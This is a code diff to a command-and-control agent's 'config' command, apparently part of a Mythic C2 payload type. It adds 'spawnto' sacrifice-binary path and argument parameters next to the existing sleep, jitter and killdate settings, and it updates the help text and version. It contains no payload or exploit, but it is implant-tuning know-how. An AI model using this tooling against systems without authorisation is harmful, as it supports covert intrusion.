@@ -24,6 +24,30 @@ class ConfigArguments(TaskArguments):
                 default_value=-1,
                 description="New killdate as unix timestamp (-1 = no change)",
             ),
+            CommandParameter(
+                name="spawnto_x64",
+                type=ParameterType.String,
+                default_value="",
+                description="x64 sacrifice binary path (empty = no change)",
+            ),
+            CommandParameter(
+                name="spawnto_x64_args",
+                type=ParameterType.String,
+                default_value="",
+                description="x64 sacrifice binary arguments (empty = no change)",
+            ),
+            CommandParameter(
+                name="spawnto_x86",
+                type=ParameterType.String,
+                default_value="",
+                description="x86 sacrifice binary path (empty = no change)",
+            ),
+            CommandParameter(
+                name="spawnto_x86_args",
+                type=ParameterType.String,
+                default_value="",
+                description="x86 sacrifice binary arguments (empty = no change)",
+            ),
         ]
 
     async def parse_arguments(self):
@@ -37,9 +61,9 @@ class ConfigArguments(TaskArguments):
 class ConfigCommand(CommandBase):
     cmd = "config"
     needs_admin = False
-    help_cmd = "config [sleep=N] [jitter=N] [killdate=N]"
-    description = "View or modify the agent's runtime configuration (sleep, jitter, killdate)."
-    version = 1
+    help_cmd = "config [sleep=N] [jitter=N] [killdate=N] [spawnto_x64=path] [spawnto_x86=path]"
+    description = "View or modify the agent's runtime configuration (sleep, jitter, killdate, spawnto paths)."
+    version = 2
     supported_ui_features = []
     author = "@Lavender-exe"
     attackmapping = []
@@ -74,6 +98,20 @@ class ConfigCommand(CommandBase):
             parts.append(f"killdate={killdate_val}")
         else:
             taskData.args.add_arg("killdate", 0xFFFFFFFF)
+
+        spawnto_x64 = taskData.args.get_arg("spawnto_x64") or ""
+        spawnto_x64_args = taskData.args.get_arg("spawnto_x64_args") or ""
+        spawnto_x86 = taskData.args.get_arg("spawnto_x86") or ""
+        spawnto_x86_args = taskData.args.get_arg("spawnto_x86_args") or ""
+
+        if spawnto_x64:
+            parts.append(f"spawnto_x64={spawnto_x64}")
+        if spawnto_x64_args:
+            parts.append(f"spawnto_x64_args={spawnto_x64_args}")
+        if spawnto_x86:
+            parts.append(f"spawnto_x86={spawnto_x86}")
+        if spawnto_x86_args:
+            parts.append(f"spawnto_x86_args={spawnto_x86_args}")
 
         if parts:
             response.DisplayParams = " ".join(parts)
